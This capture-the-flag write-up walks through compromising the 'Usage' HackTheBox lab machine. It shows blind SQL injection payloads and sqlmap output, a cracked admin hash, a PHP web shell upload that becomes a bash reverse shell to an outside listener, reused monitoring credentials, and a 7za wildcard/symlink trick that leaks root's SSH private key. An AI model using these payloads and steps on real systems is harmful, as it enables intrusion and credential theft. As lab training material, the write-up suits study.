### Summary
We open the box with some subdomain brute-force to find `[admin.]usage.htb`. We find a SQLi in the `forget_password` functionality of `usage.htb` and leak and crack the admin hash, allowing us to log into the `laravel` admin interface on `admin.usage.htb`. We find an avatar image upload endpoint and capture and modify the request to get a `php` reverse shell and gain access to the user `dash`. They have a `.monitrc` file with a password that allows us to `ssh` as the user `xander`. They're able to run a custom binary with passwordless `sudo` that executes a `7za` wildcard command via `system()`, allowing us arbitrary file read which we can use to leak the `ssh` key for the `root` user.

### Tools
- `ffuf`
- `burp`
- `sqlmap`
- `hashcat`
- `binary ninja`

###### [[#Recon]]
- [[#Initial Scan]]
	- [[#Subdomain Bruteforce]]
- [[#usage.htb - TCP 80]]
	- [[#SQL Injection]]
###### [[#User Shell - dash]]
- [[#admin.usage.htb - TCP 80]]
- [[#Enumeration as dash]]
###### [[#User Shell - xander]]
- [[#Monit]]
- [[#Enumeration as xander]]
- [[#usage_management]]
###### [[#Root Shell]]
- [[#7za Wildcard Spare Trick]]
	- [[#poc]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.2.28 -oN nmap/tcp             
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

❯ sudo nmap -p 22,80 -sCV -vv 10.129.2.28 -oN nmap/tcpScripts
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFfdLKVCM7tItpTAWFFy6gTlaOXOkNbeGIN9+NQMn89HkDBG3W3XDQDyM5JAYDlvDpngF58j/WrZkZw0rS6YqS0=
|   256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHr8ATPpxGtqlj8B7z2Lh7GrZVTSsLb6MkU3laICZlTk
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- The TTL lines up with a POSIX adherent system
- The OpenSSH and nginx versions indicate `Ubuntu 22.04`
- There's virtual host / multiple domains on the system indicated by the HTTP redirect to `usage.htb`

### Subdomain Bruteforce
```sh
❯ ffuf -u "http://10.129.2.28" -H "Host: FUZZ.usage.htb" -w ~/ctf/TOOLS/wordlist/Discovery/DNS/subdomains-top1million-20000.txt -ac
...
admin            [Status: 200, Size: 3304, Words: 493, Lines: 89, Duration: 74ms]
```
- We'll add both `admin.usage.htb` and `usage.htb` in our `/etc/hosts` file
- Re-scanning port `80` on nmap doesn't show anything useful

## usage.htb - TCP 80
---
- Navigating to `http://usage.htb` directs us to a login page running on `laravel`, `php`
- We can register an email address and login to find a blog webpage via the `dashboard` subdirectory but nothing from there
- There's a forget password button that we can click that allows us to input email addresses
- I tested each entry of the `login` and `register` menus for SQL injection (with a single quote `'`) but nothing happened
- I tested the email address field in the `forgot password` menu and it returned a `500` error!

### SQL Injection
- If we provide the payload with `'OR 1=1 -- - ` then we get a redirect instead of an error
	- We don't get information back though, indicating `Blind SQL Injection`
- If we send the payload `' AND (SELECT 'a' FROM users LIMIT 1)='a -- - ` then we get a redirect, indicating that the `users` table exists
- We can try to use `ffuf` to see if we can catch any database names:
```sh
❯ ffuf -request forget.req -w ~/ctf/TOOLS/wordlist/Discovery/Web-Content/common.txt -mc all -request-proto http -fc 503,500 -p 0.5
...
blog               [Status: 302, Size: 374, Words: 60, Lines: 12, Duration: 37ms]
users              [Status: 302, Size: 374, Words: 60, Lines: 12, Duration: 90ms]
```
- Given that we didn't find an obvious password db, let's continue with `sqlmap`

- We can save off the `burp` request to a file and pass it to `sqlmap` to try and  grab the db banner:
```sh
❯ sqlmap -r forget.req --level=5 --risk=3 --batch --threads=10 -b      
...
sqlmap identified the following injection point(s) with a total of 9678 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=E5tObkYZ3hzgf83gxR4g3HlmwXBRG8u6O7sTd4Zq&email=yomama@a.a\' AND 2295=(SELECT (CASE WHEN (2295=2295) THEN 2295 ELSE (SELECT 1301 UNION SELECT 2299) END))-- mtoO

    Type: time-based blind
    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
    Payload: _token=E5tObkYZ3hzgf83gxR4g3HlmwXBRG8u6O7sTd4Zq&email=yomama@a.a\' AND 2400=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- xzjm
---
...
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL > 5.0.12
banner: '8.0.36-0ubuntu0.22.04.1'
```

- Nice! Now we can enumerate the databases with `--dbs`
```sh
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog
```
- `usage_blog` is the one we're interested in, we can enumerate tables:
```sh
Database: usage_blog
[15 tables]
+------------------------+
| admin_menu             |
| admin_operation_log    |
| admin_permissions      |
| admin_role_menu        |
| admin_role_permissions |
| admin_role_users       |
| admin_roles            |
| admin_user_permissions |
| admin_users            |
| blog                   |
| failed_jobs            |
| migrations             |
| password_reset_tokens  |
| personal_access_tokens |
| users                  |
+------------------------+
```
- I decided to dump the `admin_users` table and found the following hash:
	- `$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2`

- I popped it into `hashcat` and it gave a few recommended hash methods, of which I chose to use the more commonly used `3200 bcrypt` and it cracked, giving us the credentials:
	- `admin:whatever1`
- It doesn't work for `usage.htb` but it does for `admin.usage.htb`!

# User Shell - dash
## admin.usage.htb - TCP 80
---
- We can log into the admin portal shown at `http://admin.usage.htb` with the credentials `admin:whatever1`
- We're redirected to a laravel admin panel with the version `1.8.17`
- The only user is us, `Administrator`
- If we go to the settings page, there's a method for us to upload an avatar for the admin user
- Since this is `laravel`, a `php` framework, I try to upload a basic `php` shell, `webshell.php` but get the error that only images can be uploaded
- I rename the webshell to `webshell.png`, capture the request in Burp and then alter the content type from `image/png` to `application/php` and the name to `webshell.php` and it works!
- We can now navigate to where the avatar download button directs us and instead pass the `cmd` parameter to get RCE!
- Unfortunately, the file seems to be deleted periodically so we'll have to alter the webshell to become a reverse shell and quickly navigate to it
```php
<?php system('bash -c "bash -i >& /dev/tcp/10.10.14.241/12345 0>&1"'); ?>
```
```sh
❯ nc -lvnp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.2.28.
Ncat: Connection from 10.129.2.28:44280.
bash: cannot set terminal process group (1088): Inappropriate ioctl for device
bash: no job control in this shell
dash@usage:/var/www/html/project_admin/public/uploads/images$ 
```
- We can perform a `python` shell upgrade and enumerate from here!

## Enumeration as dash
---
- There are 2 users in the `/home` directory, `dash` and `xander`
- We're able to grab the `user.txt`
```sh
dash@usage:/var/www/html/project_admin$ cat ~/user.txt 
7f79ea58cefb866aa6d3e3e53578326d
```

- We find config .php files in `/var/www/html/project_admin/config` but nothing super interesting 
	- Some SQL databases with the username `forge` and empty passwords
- If we inspect our home directory with `ls -lah`, we see some atypical `.monit*` files

# User Shell - xander
## Monit
---
- [Monit](https://mmonit.com/monit/documentation/monit.html#SYNOPSIS) advertises itself as a utility for managing and monitoring processes, programs, files, directories and filesystems on a Unix system
```sh
dash@usage:/var/www/html$ monit -V
This is Monit version 5.31.0
Built with ssl, with ipv6, with compression, with pam and with large files
Copyright (C) 2001-2022 Tildeslash Ltd. All Rights Reserved.
```
- I didn't find any interesting CVE hits for this version of monit
- We can inspect the `.monitrc` file:
```text
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert


#System Monitoring 
check system usage
    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert 
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert
```
- Looks like we've got a password! `3nc0d3d_pa$$w0rd` 
- We can test if this works via `ssh` with `nxc`:
```sh
❯ nxc ssh 10.129.2.28 -u xander -p '3nc0d3d_pa$$w0rd'
SSH         10.129.2.28     22     10.129.2.28      [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6
SSH         10.129.2.28     22     10.129.2.28      [+] xander:3nc0d3d_pa$$w0rd  Linux - Shell access!
```

## Enumeration as xander
---
- I performed `find / -type d -user xander 2>/dev/null` to search for all directories owned by `xander` but nothing interesting
- I performed `find / -type f -perm -4000 2>/dev/null` to search for suid binaries on the box but nothing interesting was popping out
- I performed `sudo -l` to see the following:
```sh
xander@usage:~$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

## usage_management
---
- The `usage_management` binary is an ELF file for x64, dynamically linked and not stripped
- We can pop it open in `binary ninja` to see it's a pretty simple binary:
```d
int32_t main(int32_t argc, char** argv, char** envp)
    puts(str: "Choose an option:")
    puts(str: "1. Project Backup")
    puts(str: "2. Backup MySQL data")
    puts(str: "3. Reset admin password")
    printf(format: "Enter your choice (1/2/3): ")
    int32_t option_1
    __isoc99_scanf(format: &d, &option_1)
    int32_t option = option_1
    
    if (option == 3)
        resetAdminPassword()
    else if (option s> 3)
        puts(str: "Invalid choice.")
    else if (option == 1)
        backupWebContent()
    else if (option == 2)
        backupMysqlData()
    else
        puts(str: "Invalid choice.")
    
    return 0
```
- `resetAdminPassword` doesn't do anything but print that a password has been reset
- `backupMysqlData` copies a sql database to a backup location

- The interesting function is `backupWebContent`
```d
int64_t backupWebContent()
    if (chdir("/var/www/html") != 0)
        return perror(s: "Error changing working directory…")
    
    return system(line: "/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *")
```
- `/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *` contains an unsafe [wildcard trick](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html#7-zip--7z--7za) 

# Root Shell
## 7za Wildcard Spare Trick 
---
- According to the [hacktricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html#7-zip--7z--7za) entry:
> Even when the privileged script _defensively_ prefixes the wildcard with `--` (to stop option parsing), the 7-Zip format supports **file list files** by prefixing the filename with `@`. Combining that with a symlink lets you _exfiltrate arbitrary files_

### poc
```sh
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```

- We can use this arbitrary read to leak the `root` user's ssh key stored at `/root/ssh/id_rsa`:
```sh
xander@usage:~$ cd /var/www/html
xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa exploit.txt
xander@usage:/var/www/html$ touch @exploit.txt
xander@usage:/var/www/html$ sudo usage_management 
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /var/backups/project.zip
--       
Path = /var/backups/project.zip
Type = zip
Physical Size = 54843719

Scanning the drive:
          
WARNING: No more files
-----BEGIN OPENSSH PRIVATE KEY-----


WARNING: No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW


WARNING: No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi


WARNING: No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q


WARNING: No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs


WARNING: No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=


WARNING: No more files
-----END OPENSSH PRIVATE KEY-----
```

- We can safe the results to a file and clean it up to get the `ssh` key:
```sh
❯ chmod 600 id_rsa 
❯ ssh -i id_rsa root@10.129.2.28
...
root@usage:~# cat ~/root.txt 
4b284c13717753e701a3edd1735523a0
```

